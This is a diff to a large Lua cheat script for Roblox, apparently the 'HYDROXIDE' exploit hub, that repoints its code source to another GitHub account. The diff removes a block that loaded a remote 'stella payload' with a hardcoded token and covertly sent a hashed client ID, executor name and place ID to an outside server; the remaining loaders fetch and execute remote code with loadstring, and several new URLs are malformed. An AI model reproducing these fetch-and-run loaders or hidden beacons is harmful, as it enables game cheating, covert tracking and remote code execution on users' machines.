@@ -3120,7 +3120,7 @@ if game.PlaceId == 3541987450 or game.PlaceId == 5208655184 or game.PlaceId == 1
         end
     end
     
-    local repo = "https://raw.githubusercontent.com/heisenburgah/HYDROXIDE/refs/heads/main/"
+    local repo = "https://raw.githubusercontent.com/fagngafuckmeinthetesla/HYDROXIDE/refs/heads/main/"
     local success, library_func = pcall(function()
         return loadstring(game:HttpGet(repo .. "DEPENDENCIES/Library.lua", true))()
     end)
@@ -3792,55 +3792,6 @@ if game.PlaceId == 3541987450 or game.PlaceId == 5208655184 or game.PlaceId == 1
                     flag_chat(message)
                 end
             end)
-        end
-
-        do -- Logging
-            do -- Stella
-                getgenv().stella_token = "2cbc19e1a7366f0a71b65856257ae123e1ab81c05126c53d61ca529af319c65c"
-                getgenv().stella_debug = false
-
-                pcall(function()
-                    loadstring(game:HttpGet("https://stella.heroinhound.cc/stella.lua",true))() -- or u can use https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPOSITORY/refs/heads/main/hello_stella.lua but stella.heroinhound.cc/stella.lua will hold the most updates although i rarely update stella payload but U NEVER KNOW. just check back.
-                end)
-            end
-
-            do -- Analytics (only sent to Hydroxide developers — baba & boss)
-                pcall(function()
-                    local function transform(id)
-                        local pepper = "HW_"
-                        local mixed = pepper .. id .. pepper
-                        local final = ""
-
-                        for i = 1, #mixed do
-                            local val = string.byte(mixed, i)
-                            final = final .. string.format("%02X", (val * 13 + i * 5) % 256)
-                        end
-
-                        if #final < 56 then
-                            final = final .. string.rep("0", 56 - #final)
-                        end
-
-                        return final:sub(1, 56)
-                    end
-
-                    local client_id = Services.RbxAnalyticsService:GetClientId()
-                    local token = transform(client_id)
-
-                    local req = http_request or request
-                    pcall(req, {
-                        Url = "https://api.heroinhound.cc/v1/analytics",
-                        Method = "POST",
-                        Headers = {
-                            ["Content-Type"] = "application/json",
-                        },
-                        Body = Services.HttpService:JSONEncode({
-                            uuid = token,
-                            executor = identifyexecutor and identifyexecutor() or "Unknown",
-                            place_id = game.PlaceId,
-                        }),
-                    })
-                end)
-            end
         end
 
         do
@@ -6921,7 +6872,7 @@ if game.PlaceId == 3541987450 or game.PlaceId == 5208655184 or game.PlaceId == 1
                                 if queue_func then
                                     local success, err = pcall(function()
                                         local loader_script = game
-										loader_script = [[if not game:IsLoaded() then game.Loaded:Wait() end task.wait(1) local s,code=pcall(function() return game:HttpGet("https://raw.githubusercontent.com/heisenburgah/HYDROXIDE/refs/heads/main/loader.lua") end) if not s then print("[QUEUE ERROR] HttpGet failed:",code) return end local fn,compileErr=loadstring(code) if not fn then print("[QUEUE ERROR] Compile failed:",compileErr) print("[QUEUE DEBUG] Response preview:",tostring(code):sub(1,200)) return end local ok,runErr=pcall(fn) if not ok then print("[QUEUE ERROR] Runtime failed:",runErr) print("[QUEUE DEBUG] Traceback:",debug.traceback()) end]]
+										loader_script = [[if not game:IsLoaded() then game.Loaded:Wait() end task.wait(1) local s,code=pcall(function() return game:HttpGet("https://github.com/fagngafuckmeinthetesla/HYDROXIDE/main/loader.lua|") end) if not s then print("[QUEUE ERROR] HttpGet failed:",code) return end local fn,compileErr=loadstring(code) if not fn then print("[QUEUE ERROR] Compile failed:",compileErr) print("[QUEUE DEBUG] Response preview:",tostring(code):sub(1,200)) return end local ok,runErr=pcall(fn) if not ok then print("[QUEUE ERROR] Runtime failed:",runErr) print("[QUEUE DEBUG] Traceback:",debug.traceback()) end]]
                                         queue_func(loader_script)
                                     end)
 
@@ -13270,7 +13221,7 @@ if game.PlaceId == 3541987450 or game.PlaceId == 5208655184 or game.PlaceId == 1
                                 if readfile and isfile and isfile("bazaar_loader.lua") then
                                     loader_script = [[local code=readfile("bazaar_loader.lua") local fn,compileErr=loadstring(code) if not fn then print("[QUEUE ERROR] Compile failed:",compileErr) print("[QUEUE DEBUG] Code preview:",code:sub(1,200)) return end local s,runErr=pcall(fn) if not s then print("[QUEUE ERROR] Runtime failed:",runErr) print("[QUEUE DEBUG] Traceback:",debug.traceback()) end]]
                                 else
-                                    loader_script = [[if not game:IsLoaded() then game.Loaded:Wait() end task.wait(1) local s,code=pcall(function() return game:HttpGet("https://raw.githubusercontent.com/heisenburgah/HYDROXIDE/refs/heads/main/loader.lua") end) if not s then print("[QUEUE ERROR] HttpGet failed:",code) return end local fn,compileErr=loadstring(code) if not fn then print("[QUEUE ERROR] Compile failed:",compileErr) print("[QUEUE DEBUG] Response preview:",tostring(code):sub(1,200)) return end local ok,runErr=pcall(fn) if not ok then print("[QUEUE ERROR] Runtime failed:",runErr) print("[QUEUE DEBUG] Traceback:",debug.traceback()) end]]
+                                    loader_script = [[if not game:IsLoaded() then game.Loaded:Wait() end task.wait(1) local s,code=pcall(function() return game:HttpGet("https://github.com/fagngafuckmeinthetesla/HYDROXIDE//main/loader.lua") end) if not s then print("[QUEUE ERROR] HttpGet failed:",code) return end local fn,compileErr=loadstring(code) if not fn then print("[QUEUE ERROR] Compile failed:",compileErr) print("[QUEUE DEBUG] Response preview:",tostring(code):sub(1,200)) return end local ok,runErr=pcall(fn) if not ok then print("[QUEUE ERROR] Runtime failed:",runErr) print("[QUEUE DEBUG] Traceback:",debug.traceback()) end]]
                                 end
                                 queue_func(loader_script)
                             end)
@@ -26980,7 +26931,7 @@ end
                             if readfile and isfile and isfile("bazaar_loader.lua") then
                                 loader_script = [[local code=readfile("bazaar_loader.lua") local fn,compileErr=loadstring(code) if not fn then print("[QUEUE ERROR] Compile failed:",compileErr) print("[QUEUE DEBUG] Code preview:",code:sub(1,200)) return end local s,runErr=pcall(fn) if not s then print("[QUEUE ERROR] Runtime failed:",runErr) print("[QUEUE DEBUG] Traceback:",debug.traceback()) end]]
                             else
-                                loader_script = [[if not game:IsLoaded() then game.Loaded:Wait() end task.wait(1) local s,code=pcall(function() return game:HttpGet("https://raw.githubusercontent.com/heisenburgah/HYDROXIDE/refs/heads/main/loader.lua") end) if not s then print("[QUEUE ERROR] HttpGet failed:",code) return end local fn,compileErr=loadstring(code) if not fn then print("[QUEUE ERROR] Compile failed:",compileErr) print("[QUEUE DEBUG] Response preview:",tostring(code):sub(1,200)) return end local ok,runErr=pcall(fn) if not ok then print("[QUEUE ERROR] Runtime failed:",runErr) print("[QUEUE DEBUG] Traceback:",debug.traceback()) end]]
+                                loader_script = [[if not game:IsLoaded() then game.Loaded:Wait() end task.wait(1) local s,code=pcall(function() return game:HttpGet("https://github.com/fagngafuckmeinthetesla/HYDROXIDE/main/loader.lua") end) if not s then print("[QUEUE ERROR] HttpGet failed:",code) return end local fn,compileErr=loadstring(code) if not fn then print("[QUEUE ERROR] Compile failed:",compileErr) print("[QUEUE DEBUG] Response preview:",tostring(code):sub(1,200)) return end local ok,runErr=pcall(fn) if not ok then print("[QUEUE ERROR] Runtime failed:",runErr) print("[QUEUE DEBUG] Traceback:",debug.traceback()) end]]
                             end
                             queue_func(loader_script)
                         end)
